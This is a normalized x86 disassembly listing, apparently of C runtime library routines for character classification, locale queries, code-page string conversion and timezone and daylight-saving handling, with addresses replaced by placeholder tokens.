add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_426f08
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_426eb7
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x10
pop ebp
retn
sub_426f36
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
lea eax [ ebp - 0x10 ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_426f8c
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_426f36
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
pop ebp
retn
sub_426fbc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x157
lea eax [ ebp - 0x10 ]
push eax
push 0x157
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_427012
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_426fbc
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x157
pop ebp
retn
sub_427042
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x117
lea eax [ ebp - 0x10 ]
push eax
push 0x117
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_427098
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_427042
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x117
pop ebp
retn
sub_4270c8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x20
lea eax [ ebp - 0x10 ]
push eax
push 0x20
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_427119
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4270c8
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x20
pop ebp
retn
sub_427166
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426baf
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_427189
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_426c05
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_4271a8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426f36
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_4271cb
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_426f8c
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_427205
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_427239
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
push ebx
mov ebx [ GetLocaleInfoW@IAT ]
push esi
push edi
xor edi edi
xor esi esi
inc edi
cmp eax esi
jne r-xdata
cmp eax 0x2
je r-xdata
push esi
push esi
push edi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoA@IAT ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rwxdata ] edi
jmp r-xdata
cmp eax edi
jne r-xdata
mov eax [ rwxdata ]
push 0x2
pop eax
mov [ rwxdata ] eax
jmp r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
leave
retn
jle r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_41a5c6
pop ecx
mov eax esi
jmp r-xdata
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_4107e9
pop ecx
cmp eax esi
je r-xdata
call sub_4275c0
mov edi esp
cmp edi esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp + 0x1c ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp edi esi
je r-xdata
sub_427378
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_427239
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4273b5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_4280c3
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
leave
retn
sub_4273fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_413d20
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_41a5c6
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_4107e9
pop ecx
cmp eax edi
je r-xdata
call sub_4275c0
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_4136f0
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_41348c
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_40fe78
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_4275ec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rwxdata ]
mov [ eax ] ecx
xor eax eax
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_427625
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rwxdata ]
mov [ eax ] ecx
xor eax eax
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_42765e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rwxdata ]
mov [ eax ] ecx
xor eax eax
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_427697
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
cmp eax ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
cmp eax ebx
je r-xdata
call sub_40d7cc
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
mov [ eax ] bl
pop esi
pop ebx
pop ebp
retn
call sub_40d7cc
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
lea esi [ eax * 4 + rwxdata ]
push [ esi ]
call sub_4136f0
inc eax
pop ecx
mov [ edi ] eax
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp eax 0x1
je r-xdata
cmp eax [ ebp + 0x10 ]
jbe r-xdata
xor eax eax
jmp r-xdata
push [ esi ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4192c8
add esp 0xc
push 0x22
pop eax
jmp r-xdata
sub_427786
push 0x2c
push r--data
call sub_40e30c
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_42774d
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_42765e
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4275ec
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_427625
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
call sub_41bbf2
mov [ ebp - 0x34 ] eax
mov [ rwxdata ] ebx
or edi 0xffffffff
mov [ rwxdata ] edi
mov [ rwxdata ] edi
push r--data
call sub_428764
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
mov eax [ rwxdata ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rwxdata
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_40fe78
pop ecx
mov [ rwxdata ] ebx
mov eax [ rwxdata ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rwxdata ] ecx
mov eax [ rwxdata ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rwxdata ] bx
je r-xdata
push esi
call sub_4136f0
inc eax
push eax
call sub_413447
pop ecx
pop ecx
mov [ rwxdata ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_4196a0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40e351
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_41a1de
add esp 0x10
test eax eax
je r-xdata
cmp [ rwxdata ] bx
je r-xdata
mov edx [ rwxdata ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_4136f0
pop ecx
inc eax
push eax
push [ rwxdata ]
call sub_4192c8
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rwxdata ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rwxdata ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_427775
push [ ebp - 0x24 ]
call sub_427753
push [ ebp - 0x28 ]
call sub_427764
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427a32
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
jmp r-xdata
push eax
call sub_40fe78
pop ecx
push esi
call sub_4280c3
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rwxdata ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rwxdata
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rwxdata
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_4280c3
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_41a1de
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_427747
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_42773b
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_4280c3
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_427acc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
mov eax edi
jne r-xdata
and eax 0x80000003
jns r-xdata
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov [ ebp - 0xc ] eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov esi [ esi * 4 + rwxdata ]
mov esi [ esi * 4 + rwxdata ]
jmp r-xdata
mov eax esi
shl eax 0x2
mov esi [ eax + rwxdata ]
mov eax esi
shl eax 0x2
mov esi [ eax + rwxdata ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ rwxdata ] esi
mov [ rwxdata ] ecx
call sub_427625
pop ecx
test eax eax
je r-xdata
mov [ rwxdata ] esi
mov [ rwxdata ] ecx
mov [ rwxdata ] edi
jmp r-xdata
add esi [ ebp + 0x1c ]
add esi eax
lea esi [ esi + eax - 0x7 ]
jmp r-xdata
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x12b ]
cdq
lea ebx [ edi - 0x1 ]
mov edi 0x190
idiv edi
push 0x64
pop edi
inc esi
push 0x7
mov [ ebp - 0x8 ] eax
mov eax ebx
cdq
idiv edi
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
sub edx eax
mov ebx edx
lea eax [ edi - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx edi
imul edx edx 0x16d
add eax esi
add eax ebx
lea eax [ edx + eax - 0x63db ]
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x14 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x18 ]
cmp edx [ ebp + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
add [ rwxdata ] eax
jns r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
imul ecx ecx 0x3c
add ecx [ ebp + 0x20 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x24 ]
imul ecx ecx 0x3e8
add ecx [ ebp + 0x28 ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
mov eax 0x5265c00
cmp [ rwxdata ] eax
jl r-xdata
add [ rwxdata ] 0x5265c00
dec [ rwxdata ]
jmp r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov [ rwxdata ] edi
sub [ rwxdata ] eax
inc [ rwxdata ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rwxdata ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rwxdata ]
jmp r-xdata
sub esi 0x7
jmp r-xdata
cmp esi eax
jle r-xdata
sub_427cc3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_4275ec
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
mov edx [ edi + 0x14 ]
push ebx
xor ebx ebx
inc ebx
cmp edx [ rwxdata ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rwxdata ] esi
je r-xdata
cmp edx [ rwxdata ]
je r-xdata
pop esi
leave
retn
cmp edx 0x6b
push 0x3
pop eax
push 0x2
pop ecx
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
jge r-xdata
movzx eax [ rwxdata ]
movzx ecx [ rwxdata ]
push eax
movzx eax [ rwxdata ]
push eax
movzx eax [ rwxdata ]
push eax
cmp [ rwxdata ] si
jne r-xdata
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
cmp ecx eax
mov edx [ edi + 0x1c ]
jge r-xdata
push esi
push esi
push esi
push esi
push esi
push ecx
push edx
push ebx
push ebx
push 0x2
pop ecx
call sub_427acc
mov eax [ ebp - 0xc ]
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x8 ]
push [ edi + 0x14 ]
push ebx
push esi
push 0x2
pop ecx
call sub_427acc
add esp 0x48
push 0x4
pop eax
mov ecx ebx
mov [ ebp - 0xc ] 0xa
mov [ ebp - 0x8 ] 0x5
movzx eax [ rwxdata ]
push eax
push esi
push esi
push edx
push esi
movzx eax [ rwxdata ]
push esi
push eax
movzx eax [ rwxdata ]
push eax
push edx
push ebx
jmp r-xdata
cmp edx eax
jl r-xdata
cmp edx ecx
jl r-xdata
movzx eax [ rwxdata ]
push eax
push esi
push esi
push [ edi + 0x14 ]
push esi
movzx eax [ rwxdata ]
push esi
push eax
movzx eax [ rwxdata ]
push eax
push [ edi + 0x14 ]
push ebx
jmp r-xdata
movzx eax [ rwxdata ]
push ebx
call sub_427acc
movzx eax [ rwxdata ]
movzx ecx [ rwxdata ]
add esp 0x24
push eax
movzx eax [ rwxdata ]
push eax
movzx eax [ rwxdata ]
push eax
cmp [ rwxdata ] si
jne r-xdata
mov eax ebx
cmp edx ecx
jg r-xdata
xor eax eax
jmp r-xdata
cmp edx eax
jg r-xdata
movzx eax [ rwxdata ]
push esi
call sub_427acc
add esp 0x24
jmp r-xdata
cmp edx eax
jle r-xdata
pop ebx
cmp edx ecx
jle r-xdata
mov eax [ edi + 0x8 ]
imul eax eax 0x3c
add eax [ edi + 0x4 ]
imul eax eax 0x3c
add eax [ edi ]
imul eax eax 0x3e8
cmp edx ecx
jne r-xdata
cmp edx ecx
jge r-xdata
cmp edx eax
jge r-xdata
xor ecx ecx
cmp eax [ rwxdata ]
setl cl
xor ecx ecx
cmp eax [ rwxdata ]
setge cl
jmp r-xdata
mov eax ecx
jmp r-xdata
sub_427e9b
push 0x8
push r--data
call sub_40e30c
xor esi esi
cmp [ rwxdata ] esi
jne r-xdata
call sub_40e351
retn
push 0x6
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rwxdata ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427ee1
call sub_427786
inc [ rwxdata ]
sub_427f22
push 0xc
push r--data
call sub_40e30c
push 0x6
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_427cc3
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427f5a
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
sub_427f63
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_427f9c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
